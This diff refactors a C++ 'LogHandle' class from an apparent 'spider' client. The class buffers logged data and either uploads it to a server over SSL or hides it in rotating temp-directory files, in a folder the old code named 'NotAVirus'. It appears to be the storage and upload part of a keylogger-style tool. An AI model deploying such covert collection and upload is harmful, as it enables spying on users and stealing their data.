@@ -9,28 +9,29 @@
 #include <string_view>
 #include <boost/bind.hpp>
 #include <boost/asio/buffer.hpp>
+#include <boost/filesystem.hpp>
+#include <log/Logger.hpp>
 #include <Network/SSLConnection.hpp>
 #include <Network/ErrorCode.hpp>
 #include <Protocol/CommandHandler.hpp>
 #include <Logging/AbstractLogHandle.hpp>
 #include <Configuration.hpp>
 
+namespace fs = boost::filesystem;
+
 namespace spi
 {
     class LogHandle : public AbstractLogHandle
     {
     public:
-        LogHandle() : _conn(nullptr)
+        LogHandle(const fs::path &dirName) noexcept : _conn(nullptr),
+                                                      _baseDir(fs::temp_directory_path() / dirName)
         {
         }
 
-        LogHandle(net::SSLConnection *conn) : _conn(conn)
+        ~LogHandle() noexcept override
         {
-        }
-
-        ~LogHandle() noexcept
-        {
-            _log(lg::Info) << "shutting down." << std::endl;
+            _log(logging::Info) << "Shutting down..." << std::endl;
         }
 
         bool setup()
@@ -42,8 +43,7 @@ namespace spi
                 _fileNb = __getFileNb() - 1;
                 rotate();
             }
-            _log(lg::Info) << "log directory path -> ['" << _baseDir << "']" << std::endl;
-            _log(lg::Info) << "successfully initialized" << std::endl;
+            _log(logging::Info) << "Started successfully" << std::endl;
             return true;
         }
 
@@ -52,9 +52,9 @@ namespace spi
             return _conn != nullptr;
         }
 
-        void connect(net::SSLConnection *conn)
+        void setConnection(net::SSLConnection *conn)
         {
-            _log(lg::Info) << "Connection set" << std::endl;
+            _log(logging::Debug) << "Switching to connected mode" << std::endl;
             _conn = conn;
             __flushLocal();
         }
@@ -79,13 +79,13 @@ namespace spi
         void flush() override
         {
             if (isConnectionValid()) {
-                _log(lg::Info) << "Send packet " << std::endl;
+                _log(logging::Debug) << "Sending logged data to server..." << std::endl;
                 _conn->asyncWriteSome(_buffer, boost::bind(&LogHandle::__handleWrite, this, net::ErrorPlaceholder));
             } else {
-                if (_logWrote + _buffer.size() > _fileMax) {
+                if (_logWritten + _buffer.size() > _fileMax) {
                     rotate();
                 }
-                _logWrote += _buffer.size();
+                _logWritten += _buffer.size();
                 std::string str(_buffer.begin(), _buffer.end());
                 _out << str << std::endl;
                 _out.flush();
@@ -95,12 +95,12 @@ namespace spi
 
         void rotate() override
         {
-          if (_out.is_open())
-              _out.close();
-          _fileNb += 1;
-          fs::path outPath = (_baseDir / std::to_string(_fileNb)).replace_extension("spi");
-          _out.open(outPath.string());
-          _logWrote = 0;
+            if (_out.is_open())
+                _out.close();
+            _fileNb += 1;
+            fs::path outPath = (_baseDir / std::to_string(_fileNb)).replace_extension("spi");
+            _out.open(outPath.string());
+            _logWritten = 0;
         }
 
     private:
@@ -148,23 +148,22 @@ namespace spi
                     }
                 }
             } catch (std::exception &e) {
-                _log(lg::Error) << e.what() << std::endl;
+                _log(logging::Error) << e.what() << std::endl;
             }
         }
 
         void __handleWrite(const ErrorCode &error)
         {
             if (!error) {
-                _log(lg::Info) << "Written without error" << std::endl;
+                _log(logging::Debug) << "Data successfully sent to server" << std::endl;
                 _buffer.clear();
             } else {
-                _log(lg::Warning) << "Unable to write on server's socket : "
-                                  << error.message() << std::endl;
+                _log(logging::Warning) << "Unable to write on server's socket : " << error.message() << std::endl;
                 disconnect();
             }
         }
 
-        unsigned long __getFileNb() const
+        unsigned long __getFileNb() const noexcept
         {
             unsigned long max = 0;
             bool looped = false;
@@ -183,13 +182,14 @@ namespace spi
             return looped ? max + 1 : 0;
         }
 
-        lg::Logger _log{"spider-log-handle", logging::Level::Debug};
+    private:
+        logging::Logger _log{"spider-log-handle", logging::Level::Debug};
         Buffer _buffer{};
         net::SSLConnection *_conn;
-        fs::path _baseDir{fs::temp_directory_path().append("NotAVirus")};
+        fs::path _baseDir;
         std::ofstream _out;
         unsigned long _fileNb;
-        unsigned long _logWrote;
+        unsigned long _logWritten;
 
         static constexpr unsigned long _bufferMax = 1024;
         static constexpr unsigned long _fileMax = 4096;
